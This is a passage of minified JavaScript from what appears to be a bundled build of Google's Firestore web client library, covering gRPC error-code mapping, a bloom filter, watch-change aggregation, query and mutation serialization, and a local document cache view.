 */var xe,se;function nk(t){switch(t){default:return X();case O.CANCELLED:case O.UNKNOWN:case O.DEADLINE_EXCEEDED:case O.RESOURCE_EXHAUSTED:case O.INTERNAL:case O.UNAVAILABLE:case O.UNAUTHENTICATED:return!1;case O.INVALID_ARGUMENT:case O.NOT_FOUND:case O.ALREADY_EXISTS:case O.PERMISSION_DENIED:case O.FAILED_PRECONDITION:case O.ABORTED:case O.OUT_OF_RANGE:case O.UNIMPLEMENTED:case O.DATA_LOSS:return!0}}function rw(t){if(t===void 0)return An("GRPC error has no .code"),O.UNKNOWN;switch(t){case xe.OK:return O.OK;case xe.CANCELLED:return O.CANCELLED;case xe.UNKNOWN:return O.UNKNOWN;case xe.DEADLINE_EXCEEDED:return O.DEADLINE_EXCEEDED;case xe.RESOURCE_EXHAUSTED:return O.RESOURCE_EXHAUSTED;case xe.INTERNAL:return O.INTERNAL;case xe.UNAVAILABLE:return O.UNAVAILABLE;case xe.UNAUTHENTICATED:return O.UNAUTHENTICATED;case xe.INVALID_ARGUMENT:return O.INVALID_ARGUMENT;case xe.NOT_FOUND:return O.NOT_FOUND;case xe.ALREADY_EXISTS:return O.ALREADY_EXISTS;case xe.PERMISSION_DENIED:return O.PERMISSION_DENIED;case xe.FAILED_PRECONDITION:return O.FAILED_PRECONDITION;case xe.ABORTED:return O.ABORTED;case xe.OUT_OF_RANGE:return O.OUT_OF_RANGE;case xe.UNIMPLEMENTED:return O.UNIMPLEMENTED;case xe.DATA_LOSS:return O.DATA_LOSS;default:return X()}}(se=xe||(xe={}))[se.OK=0]="OK",se[se.CANCELLED=1]="CANCELLED",se[se.UNKNOWN=2]="UNKNOWN",se[se.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",se[se.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",se[se.NOT_FOUND=5]="NOT_FOUND",se[se.ALREADY_EXISTS=6]="ALREADY_EXISTS",se[se.PERMISSION_DENIED=7]="PERMISSION_DENIED",se[se.UNAUTHENTICATED=16]="UNAUTHENTICATED",se[se.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",se[se.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",se[se.ABORTED=10]="ABORTED",se[se.OUT_OF_RANGE=11]="OUT_OF_RANGE",se[se.UNIMPLEMENTED=12]="UNIMPLEMENTED",se[se.INTERNAL=13]="INTERNAL",se[se.UNAVAILABLE=14]="UNAVAILABLE",se[se.DATA_LOSS=15]="DATA_LOSS";/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function rk(){return new TextEncoder}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ik=new kr([4294967295,4294967295],0);function Ug(t){const e=rk().encode(t),n=new R0;return n.update(e),new Uint8Array(n.digest())}function jg(t){const e=new DataView(t.buffer),n=e.getUint32(0,!0),r=e.getUint32(4,!0),i=e.getUint32(8,!0),s=e.getUint32(12,!0);return[new kr([n,r],0),new kr([i,s],0)]}class uf{constructor(e,n,r){if(this.bitmap=e,this.padding=n,this.hashCount=r,n<0||n>=8)throw new Ss(`Invalid padding: ${n}`);if(r<0)throw new Ss(`Invalid hash count: ${r}`);if(e.length>0&&this.hashCount===0)throw new Ss(`Invalid hash count: ${r}`);if(e.length===0&&n!==0)throw new Ss(`Invalid padding when bitmap length is 0: ${n}`);this.Ie=8*e.length-n,this.Te=kr.fromNumber(this.Ie)}Ee(e,n,r){let i=e.add(n.multiply(kr.fromNumber(r)));return i.compare(ik)===1&&(i=new kr([i.getBits(0),i.getBits(1)],0)),i.modulo(this.Te).toNumber()}de(e){return(this.bitmap[Math.floor(e/8)]&1<<e%8)!=0}mightContain(e){if(this.Ie===0)return!1;const n=Ug(e),[r,i]=jg(n);for(let s=0;s<this.hashCount;s++){const o=this.Ee(r,i,s);if(!this.de(o))return!1}return!0}static create(e,n,r){const i=e%8==0?0:8-e%8,s=new Uint8Array(Math.ceil(e/8)),o=new uf(s,i,n);return r.forEach(l=>o.insert(l)),o}insert(e){if(this.Ie===0)return;const n=Ug(e),[r,i]=jg(n);for(let s=0;s<this.hashCount;s++){const o=this.Ee(r,i,s);this.Ae(o)}}Ae(e){const n=Math.floor(e/8),r=e%8;this.bitmap[n]|=1<<r}}class Ss extends Error{constructor(){super(...arguments),this.name="BloomFilterError"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class tu{constructor(e,n,r,i,s){this.snapshotVersion=e,this.targetChanges=n,this.targetMismatches=r,this.documentUpdates=i,this.resolvedLimboDocuments=s}static createSynthesizedRemoteEventForCurrentChange(e,n,r){const i=new Map;return i.set(e,No.createSynthesizedTargetChangeForCurrentChange(e,n,r)),new tu(Z.min(),i,new Ie(le),Cn(),ne())}}class No{constructor(e,n,r,i,s){this.resumeToken=e,this.current=n,this.addedDocuments=r,this.modifiedDocuments=i,this.removedDocuments=s}static createSynthesizedTargetChangeForCurrentChange(e,n,r){return new No(r,n,ne(),ne(),ne())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class za{constructor(e,n,r,i){this.Re=e,this.removedTargetIds=n,this.key=r,this.Ve=i}}class iw{constructor(e,n){this.targetId=e,this.me=n}}class sw{constructor(e,n,r=We.EMPTY_BYTE_STRING,i=null){this.state=e,this.targetIds=n,this.resumeToken=r,this.cause=i}}class zg{constructor(){this.fe=0,this.ge=$g(),this.pe=We.EMPTY_BYTE_STRING,this.ye=!1,this.we=!0}get current(){return this.ye}get resumeToken(){return this.pe}get Se(){return this.fe!==0}get be(){return this.we}De(e){e.approximateByteSize()>0&&(this.we=!0,this.pe=e)}ve(){let e=ne(),n=ne(),r=ne();return this.ge.forEach((i,s)=>{switch(s){case 0:e=e.add(i);break;case 2:n=n.add(i);break;case 1:r=r.add(i);break;default:X()}}),new No(this.pe,this.ye,e,n,r)}Ce(){this.we=!1,this.ge=$g()}Fe(e,n){this.we=!0,this.ge=this.ge.insert(e,n)}Me(e){this.we=!0,this.ge=this.ge.remove(e)}xe(){this.fe+=1}Oe(){this.fe-=1,ce(this.fe>=0)}Ne(){this.we=!0,this.ye=!0}}class sk{constructor(e){this.Le=e,this.Be=new Map,this.ke=Cn(),this.qe=Bg(),this.Qe=new Ie(le)}Ke(e){for(const n of e.Re)e.Ve&&e.Ve.isFoundDocument()?this.$e(n,e.Ve):this.Ue(n,e.key,e.Ve);for(const n of e.removedTargetIds)this.Ue(n,e.key,e.Ve)}We(e){this.forEachTarget(e,n=>{const r=this.Ge(n);switch(e.state){case 0:this.ze(n)&&r.De(e.resumeToken);break;case 1:r.Oe(),r.Se||r.Ce(),r.De(e.resumeToken);break;case 2:r.Oe(),r.Se||this.removeTarget(n);break;case 3:this.ze(n)&&(r.Ne(),r.De(e.resumeToken));break;case 4:this.ze(n)&&(this.je(n),r.De(e.resumeToken));break;default:X()}})}forEachTarget(e,n){e.targetIds.length>0?e.targetIds.forEach(n):this.Be.forEach((r,i)=>{this.ze(i)&&n(i)})}He(e){const n=e.targetId,r=e.me.count,i=this.Je(n);if(i){const s=i.target;if(xh(s))if(r===0){const o=new K(s.path);this.Ue(n,o,Ze.newNoDocument(o,Z.min()))}else ce(r===1);else{const o=this.Ye(n);if(o!==r){const l=this.Ze(e),u=l?this.Xe(l,e,o):1;if(u!==0){this.je(n);const h=u===2?"TargetPurposeExistenceFilterMismatchBloom":"TargetPurposeExistenceFilterMismatch";this.Qe=this.Qe.insert(n,h)}}}}}Ze(e){const n=e.me.unchangedNames;if(!n||!n.bits)return null;const{bits:{bitmap:r="",padding:i=0},hashCount:s=0}=n;let o,l;try{o=Fr(r).toUint8Array()}catch(u){if(u instanceof L0)return Di("Decoding the base64 bloom filter in existence filter failed ("+u.message+"); ignoring the bloom filter and falling back to full re-query."),null;throw u}try{l=new uf(o,i,s)}catch(u){return Di(u instanceof Ss?"BloomFilter error: ":"Applying bloom filter failed: ",u),null}return l.Ie===0?null:l}Xe(e,n,r){return n.me.count===r-this.nt(e,n.targetId)?0:2}nt(e,n){const r=this.Le.getRemoteKeysForTarget(n);let i=0;return r.forEach(s=>{const o=this.Le.tt(),l=`projects/${o.projectId}/databases/${o.database}/documents/${s.path.canonicalString()}`;e.mightContain(l)||(this.Ue(n,s,null),i++)}),i}rt(e){const n=new Map;this.Be.forEach((s,o)=>{const l=this.Je(o);if(l){if(s.current&&xh(l.target)){const u=new K(l.target.path);this.ke.get(u)!==null||this.it(o,u)||this.Ue(o,u,Ze.newNoDocument(u,e))}s.be&&(n.set(o,s.ve()),s.Ce())}});let r=ne();this.qe.forEach((s,o)=>{let l=!0;o.forEachWhile(u=>{const h=this.Je(u);return!h||h.purpose==="TargetPurposeLimboResolution"||(l=!1,!1)}),l&&(r=r.add(s))}),this.ke.forEach((s,o)=>o.setReadTime(e));const i=new tu(e,n,this.Qe,this.ke,r);return this.ke=Cn(),this.qe=Bg(),this.Qe=new Ie(le),i}$e(e,n){if(!this.ze(e))return;const r=this.it(e,n.key)?2:0;this.Ge(e).Fe(n.key,r),this.ke=this.ke.insert(n.key,n),this.qe=this.qe.insert(n.key,this.st(n.key).add(e))}Ue(e,n,r){if(!this.ze(e))return;const i=this.Ge(e);this.it(e,n)?i.Fe(n,1):i.Me(n),this.qe=this.qe.insert(n,this.st(n).delete(e)),r&&(this.ke=this.ke.insert(n,r))}removeTarget(e){this.Be.delete(e)}Ye(e){const n=this.Ge(e).ve();return this.Le.getRemoteKeysForTarget(e).size+n.addedDocuments.size-n.removedDocuments.size}xe(e){this.Ge(e).xe()}Ge(e){let n=this.Be.get(e);return n||(n=new zg,this.Be.set(e,n)),n}st(e){let n=this.qe.get(e);return n||(n=new Be(le),this.qe=this.qe.insert(e,n)),n}ze(e){const n=this.Je(e)!==null;return n||G("WatchChangeAggregator","Detected inactive target",e),n}Je(e){const n=this.Be.get(e);return n&&n.Se?null:this.Le.ot(e)}je(e){this.Be.set(e,new zg),this.Le.getRemoteKeysForTarget(e).forEach(n=>{this.Ue(e,n,null)})}it(e,n){return this.Le.getRemoteKeysForTarget(e).has(n)}}function Bg(){return new Ie(K.comparator)}function $g(){return new Ie(K.comparator)}const ok={asc:"ASCENDING",desc:"DESCENDING"},ak={"<":"LESS_THAN","<=":"LESS_THAN_OR_EQUAL",">":"GREATER_THAN",">=":"GREATER_THAN_OR_EQUAL","==":"EQUAL","!=":"NOT_EQUAL","array-contains":"ARRAY_CONTAINS",in:"IN","not-in":"NOT_IN","array-contains-any":"ARRAY_CONTAINS_ANY"},lk={and:"AND",or:"OR"};class uk{constructor(e,n){this.databaseId=e,this.useProto3Json=n}}function Nh(t,e){return t.useProto3Json||Yl(e)?e:{value:e}}function Cl(t,e){return t.useProto3Json?`${new Date(1e3*e.seconds).toISOString().replace(/\.\d*/,"").replace("Z","")}.${("000000000"+e.nanoseconds).slice(-9)}Z`:{seconds:""+e.seconds,nanos:e.nanoseconds}}function ow(t,e){return t.useProto3Json?e.toBase64():e.toUint8Array()}function ck(t,e){return Cl(t,e.toTimestamp())}function en(t){return ce(!!t),Z.fromTimestamp(function(n){const r=lr(n);return new pe(r.seconds,r.nanos)}(t))}function cf(t,e){return Dh(t,e).canonicalString()}function Dh(t,e){const n=function(i){return new ye(["projects",i.projectId,"databases",i.database])}(t).child("documents");return e===void 0?n:n.child(e)}function aw(t){const e=ye.fromString(t);return ce(dw(e)),e}function bh(t,e){return cf(t.databaseId,e.path)}function gc(t,e){const n=aw(e);if(n.get(1)!==t.databaseId.projectId)throw new H(O.INVALID_ARGUMENT,"Tried to deserialize key from different project: "+n.get(1)+" vs "+t.databaseId.projectId);if(n.get(3)!==t.databaseId.database)throw new H(O.INVALID_ARGUMENT,"Tried to deserialize key from different database: "+n.get(3)+" vs "+t.databaseId.database);return new K(uw(n))}function lw(t,e){return cf(t.databaseId,e)}function hk(t){const e=aw(t);return e.length===4?ye.emptyPath():uw(e)}function Vh(t){return new ye(["projects",t.databaseId.projectId,"databases",t.databaseId.database]).canonicalString()}function uw(t){return ce(t.length>4&&t.get(4)==="documents"),t.popFirst(5)}function Wg(t,e,n){return{name:bh(t,e),fields:n.value.mapValue.fields}}function dk(t,e){let n;if("targetChange"in e){e.targetChange;const r=function(h){return h==="NO_CHANGE"?0:h==="ADD"?1:h==="REMOVE"?2:h==="CURRENT"?3:h==="RESET"?4:X()}(e.targetChange.targetChangeType||"NO_CHANGE"),i=e.targetChange.targetIds||[],s=function(h,f){return h.useProto3Json?(ce(f===void 0||typeof f=="string"),We.fromBase64String(f||"")):(ce(f===void 0||f instanceof Buffer||f instanceof Uint8Array),We.fromUint8Array(f||new Uint8Array))}(t,e.targetChange.resumeToken),o=e.targetChange.cause,l=o&&function(h){const f=h.code===void 0?O.UNKNOWN:rw(h.code);return new H(f,h.message||"")}(o);n=new sw(r,i,s,l||null)}else if("documentChange"in e){e.documentChange;const r=e.documentChange;r.document,r.document.name,r.document.updateTime;const i=gc(t,r.document.name),s=en(r.document.updateTime),o=r.document.createTime?en(r.document.createTime):Z.min(),l=new dt({mapValue:{fields:r.document.fields}}),u=Ze.newFoundDocument(i,s,o,l),h=r.targetIds||[],f=r.removedTargetIds||[];n=new za(h,f,u.key,u)}else if("documentDelete"in e){e.documentDelete;const r=e.documentDelete;r.document;const i=gc(t,r.document),s=r.readTime?en(r.readTime):Z.min(),o=Ze.newNoDocument(i,s),l=r.removedTargetIds||[];n=new za([],l,o.key,o)}else if("documentRemove"in e){e.documentRemove;const r=e.documentRemove;r.document;const i=gc(t,r.document),s=r.removedTargetIds||[];n=new za([],s,i,null)}else{if(!("filter"in e))return X();{e.filter;const r=e.filter;r.targetId;const{count:i=0,unchangedNames:s}=r,o=new tk(i,s),l=r.targetId;n=new iw(l,o)}}return n}function fk(t,e){let n;if(e instanceof Po)n={update:Wg(t,e.key,e.value)};else if(e instanceof af)n={delete:bh(t,e.key)};else if(e instanceof fr)n={update:Wg(t,e.key,e.data),updateMask:Tk(e.fieldMask)};else{if(!(e instanceof Jx))return X();n={verify:bh(t,e.key)}}return e.fieldTransforms.length>0&&(n.updateTransforms=e.fieldTransforms.map(r=>function(s,o){const l=o.transform;if(l instanceof Sl)return{fieldPath:o.field.canonicalString(),setToServerValue:"REQUEST_TIME"};if(l instanceof fo)return{fieldPath:o.field.canonicalString(),appendMissingElements:{values:l.elements}};if(l instanceof po)return{fieldPath:o.field.canonicalString(),removeAllFromArray:{values:l.elements}};if(l instanceof Al)return{fieldPath:o.field.canonicalString(),increment:l.Pe};throw X()}(0,r))),e.precondition.isNone||(n.currentDocument=function(i,s){return s.updateTime!==void 0?{updateTime:ck(i,s.updateTime)}:s.exists!==void 0?{exists:s.exists}:X()}(t,e.precondition)),n}function pk(t,e){return t&&t.length>0?(ce(e!==void 0),t.map(n=>function(i,s){let o=i.updateTime?en(i.updateTime):en(s);return o.isEqual(Z.min())&&(o=en(s)),new Qx(o,i.transformResults||[])}(n,e))):[]}function mk(t,e){return{documents:[lw(t,e.path)]}}function gk(t,e){const n={structuredQuery:{}},r=e.path;let i;e.collectionGroup!==null?(i=r,n.structuredQuery.from=[{collectionId:e.collectionGroup,allDescendants:!0}]):(i=r.popLast(),n.structuredQuery.from=[{collectionId:r.lastSegment()}]),n.parent=lw(t,i);const s=function(h){if(h.length!==0)return hw(Wt.create(h,"and"))}(e.filters);s&&(n.structuredQuery.where=s);const o=function(h){if(h.length!==0)return h.map(f=>function(g){return{field:Jr(g.field),direction:_k(g.dir)}}(f))}(e.orderBy);o&&(n.structuredQuery.orderBy=o);const l=Nh(t,e.limit);return l!==null&&(n.structuredQuery.limit=l),e.startAt&&(n.structuredQuery.startAt=function(h){return{before:h.inclusive,values:h.position}}(e.startAt)),e.endAt&&(n.structuredQuery.endAt=function(h){return{before:!h.inclusive,values:h.position}}(e.endAt)),{_t:n,parent:i}}function yk(t){let e=hk(t.parent);const n=t.structuredQuery,r=n.from?n.from.length:0;let i=null;if(r>0){ce(r===1);const f=n.from[0];f.allDescendants?i=f.collectionId:e=e.child(f.collectionId)}let s=[];n.where&&(s=function(p){const g=cw(p);return g instanceof Wt&&j0(g)?g.getFilters():[g]}(n.where));let o=[];n.orderBy&&(o=function(p){return p.map(g=>function(A){return new Il(Zr(A.field),function(N){switch(N){case"ASCENDING":return"asc";case"DESCENDING":return"desc";default:return}}(A.direction))}(g))}(n.orderBy));let l=null;n.limit&&(l=function(p){let g;return g=typeof p=="object"?p.value:p,Yl(g)?null:g}(n.limit));let u=null;n.startAt&&(u=function(p){const g=!!p.before,v=p.values||[];return new Tl(v,g)}(n.startAt));let h=null;return n.endAt&&(h=function(p){const g=!p.before,v=p.values||[];return new Tl(v,g)}(n.endAt)),Lx(e,i,o,s,l,"F",u,h)}function vk(t,e){const n=function(i){switch(i){case"TargetPurposeListen":return null;case"TargetPurposeExistenceFilterMismatch":return"existence-filter-mismatch";case"TargetPurposeExistenceFilterMismatchBloom":return"existence-filter-mismatch-bloom";case"TargetPurposeLimboResolution":return"limbo-document";default:return X()}}(e.purpose);return n==null?null:{"goog-listen-tags":n}}function cw(t){return t.unaryFilter!==void 0?function(n){switch(n.unaryFilter.op){case"IS_NAN":const r=Zr(n.unaryFilter.field);return Pe.create(r,"==",{doubleValue:NaN});case"IS_NULL":const i=Zr(n.unaryFilter.field);return Pe.create(i,"==",{nullValue:"NULL_VALUE"});case"IS_NOT_NAN":const s=Zr(n.unaryFilter.field);return Pe.create(s,"!=",{doubleValue:NaN});case"IS_NOT_NULL":const o=Zr(n.unaryFilter.field);return Pe.create(o,"!=",{nullValue:"NULL_VALUE"});default:return X()}}(t):t.fieldFilter!==void 0?function(n){return Pe.create(Zr(n.fieldFilter.field),function(i){switch(i){case"EQUAL":return"==";case"NOT_EQUAL":return"!=";case"GREATER_THAN":return">";case"GREATER_THAN_OR_EQUAL":return">=";case"LESS_THAN":return"<";case"LESS_THAN_OR_EQUAL":return"<=";case"ARRAY_CONTAINS":return"array-contains";case"IN":return"in";case"NOT_IN":return"not-in";case"ARRAY_CONTAINS_ANY":return"array-contains-any";default:return X()}}(n.fieldFilter.op),n.fieldFilter.value)}(t):t.compositeFilter!==void 0?function(n){return Wt.create(n.compositeFilter.filters.map(r=>cw(r)),function(i){switch(i){case"AND":return"and";case"OR":return"or";default:return X()}}(n.compositeFilter.op))}(t):X()}function _k(t){return ok[t]}function wk(t){return ak[t]}function Ek(t){return lk[t]}function Jr(t){return{fieldPath:t.canonicalString()}}function Zr(t){return je.fromServerFormat(t.fieldPath)}function hw(t){return t instanceof Pe?function(n){if(n.op==="=="){if(Pg(n.value))return{unaryFilter:{field:Jr(n.field),op:"IS_NAN"}};if(kg(n.value))return{unaryFilter:{field:Jr(n.field),op:"IS_NULL"}}}else if(n.op==="!="){if(Pg(n.value))return{unaryFilter:{field:Jr(n.field),op:"IS_NOT_NAN"}};if(kg(n.value))return{unaryFilter:{field:Jr(n.field),op:"IS_NOT_NULL"}}}return{fieldFilter:{field:Jr(n.field),op:wk(n.op),value:n.value}}}(t):t instanceof Wt?function(n){const r=n.getFilters().map(i=>hw(i));return r.length===1?r[0]:{compositeFilter:{op:Ek(n.op),filters:r}}}(t):X()}function Tk(t){const e=[];return t.fields.forEach(n=>e.push(n.canonicalString())),{fieldPaths:e}}function dw(t){return t.length>=4&&t.get(0)==="projects"&&t.get(2)==="databases"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Hn{constructor(e,n,r,i,s=Z.min(),o=Z.min(),l=We.EMPTY_BYTE_STRING,u=null){this.target=e,this.targetId=n,this.purpose=r,this.sequenceNumber=i,this.snapshotVersion=s,this.lastLimboFreeSnapshotVersion=o,this.resumeToken=l,this.expectedCount=u}withSequenceNumber(e){return new Hn(this.target,this.targetId,this.purpose,e,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,this.expectedCount)}withResumeToken(e,n){return new Hn(this.target,this.targetId,this.purpose,this.sequenceNumber,n,this.lastLimboFreeSnapshotVersion,e,null)}withExpectedCount(e){return new Hn(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,e)}withLastLimboFreeSnapshotVersion(e){return new Hn(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,e,this.resumeToken,this.expectedCount)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ik{constructor(e){this.ct=e}}function Sk(t){const e=yk({parent:t.parent,structuredQuery:t.structuredQuery});return t.limitType==="LAST"?Ph(e,e.limit,"L"):e}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ak{constructor(){this.un=new Ck}addToCollectionParentIndex(e,n){return this.un.add(n),L.resolve()}getCollectionParents(e,n){return L.resolve(this.un.getEntries(n))}addFieldIndex(e,n){return L.resolve()}deleteFieldIndex(e,n){return L.resolve()}deleteAllFieldIndexes(e){return L.resolve()}createTargetIndexes(e,n){return L.resolve()}getDocumentsMatchingTarget(e,n){return L.resolve(null)}getIndexType(e,n){return L.resolve(0)}getFieldIndexes(e,n){return L.resolve([])}getNextCollectionGroupToUpdate(e){return L.resolve(null)}getMinOffset(e,n){return L.resolve(ar.min())}getMinOffsetFromCollectionGroup(e,n){return L.resolve(ar.min())}updateCollectionGroup(e,n,r){return L.resolve()}updateIndexEntries(e,n){return L.resolve()}}class Ck{constructor(){this.index={}}add(e){const n=e.lastSegment(),r=e.popLast(),i=this.index[n]||new Be(ye.comparator),s=!i.has(r);return this.index[n]=i.add(r),s}has(e){const n=e.lastSegment(),r=e.popLast(),i=this.index[n];return i&&i.has(r)}getEntries(e){return(this.index[e]||new Be(ye.comparator)).toArray()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Li{constructor(e){this.Ln=e}next(){return this.Ln+=2,this.Ln}static Bn(){return new Li(0)}static kn(){return new Li(-1)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Rk{constructor(){this.changes=new Hi(e=>e.toString(),(e,n)=>e.isEqual(n)),this.changesApplied=!1}addEntry(e){this.assertNotApplied(),this.changes.set(e.key,e)}removeEntry(e,n){this.assertNotApplied(),this.changes.set(e,Ze.newInvalidDocument(e).setReadTime(n))}getEntry(e,n){this.assertNotApplied();const r=this.changes.get(n);return r!==void 0?L.resolve(r):this.getFromCache(e,n)}getEntries(e,n){return this.getAllFromCache(e,n)}apply(e){return this.assertNotApplied(),this.changesApplied=!0,this.applyChanges(e)}assertNotApplied(){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *//**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class xk{constructor(e,n){this.overlayedDocument=e,this.mutatedFields=n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class kk{constructor(e,n,r,i){this.remoteDocumentCache=e,this.mutationQueue=n,this.documentOverlayCache=r,this.indexManager=i}getDocument(e,n){let r=null;return this.documentOverlayCache.getOverlay(e,n).next(i=>(r=i,this.remoteDocumentCache.getEntry(e,n))).next(i=>(r!==null&&js(r.mutation,i,Et.empty(),pe.now()),i))}getDocuments(e,n){return this.remoteDocumentCache.getEntries(e,n).next(r=>this.getLocalViewOfDocuments(e,r,ne()).next(()=>r))}getLocalViewOfDocuments(e,n,r=ne()){const i=Sr();return this.populateOverlays(e,i,n).next(()=>this.computeViews(e,n,i,r).next(s=>{let o=Is();return s.forEach((l,u)=>{o=o.insert(l,u.overlayedDocument)}),o}))}getOverlayedDocuments(e,n){const r=Sr();return this.populateOverlays(e,r,n).next(()=>this.computeViews(e,n,r,ne()))}populateOverlays(e,n,r){const i=[];return r.forEach(s=>{n.has(s)||i.push(s)}),this.documentOverlayCache.getOverlays(e,i).next(s=>{s.forEach((o,l)=>{n.set(o,l)})})}computeViews(e,n,r,i){let s=Cn();const o=Us(),l=function(){return Us()}();return n.forEach((u,h)=>{const f=r.get(h.key);i.has(h.key)&&(f===void 0||f.mutation instanceof fr)?s=s.insert(h.key,h):f!==void 0?(o.set(h.key,f.mutation.getFieldMask()),js(f.mutation,h,f.mutation.getFieldMask(),pe.now())):o.set(h.key,Et.empty())}),this.recalculateAndSaveOverlays(e,s).next(u=>(u.forEach((h,f)=>o.set(h,f)),n.forEach((h,f)=>{var p;return l.set(h,new xk(f,(p=o.get(h))!==null&&p!==void 0?p:null))}),l))}recalculateAndSaveOverlays(e,n){const r=Us();let i=new Ie((o,l)=>o-l),s=ne();return this.mutationQueue.getAllMutationBatchesAffectingDocumentKeys(e,n).next(o=>{for(const l of o)l.keys().forEach(u=>{const h=n.get(u);if(h===null)return;let f=r.get(u)||Et.empty();f=l.applyToLocalView(h,f),r.set(u,f);const p=(i.get(l.batchId)||ne()).add(u);i=i.insert(l.batchId,p)})}).next(()=>{const o=[],l=i.getReverseIterator();for(;l.hasNext();){const u=l.getNext(),h=u.key,f=u.value,p=Q0();f.forEach(g=>{if(!s.has(g)){const 